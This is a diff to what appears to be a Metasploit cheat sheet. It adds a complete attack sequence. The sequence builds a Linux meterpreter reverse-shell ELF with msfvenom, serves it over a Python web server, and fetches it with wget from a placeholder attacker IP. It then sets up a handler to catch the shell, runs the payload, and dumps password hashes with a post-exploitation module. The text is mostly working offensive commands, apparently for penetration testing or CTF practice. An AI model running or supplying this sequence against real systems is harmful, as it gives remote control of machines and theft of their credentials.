@@ -303,3 +303,35 @@ msf > auxiliary(scanner/smb/smb_version)
 >msfvenom -l payloads                                                                 # List all payloads
 >msfvenom -e php/base64 -f raw                                                        # -e <code> Encode payload and -f <format> output: raw, elf, exe, asp  
 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
+chmod +x rev_shell.elf
+python3 -m http.server 9000
+wget http://ATTACKING_MACHINE_IP:9000/rev_shell.elf
+
+msfconsole
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST 10.10.X.X
+set LPORT XXXX
+run
+
+./rev_shell.elf
+run post/linux/gather/hashdump
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
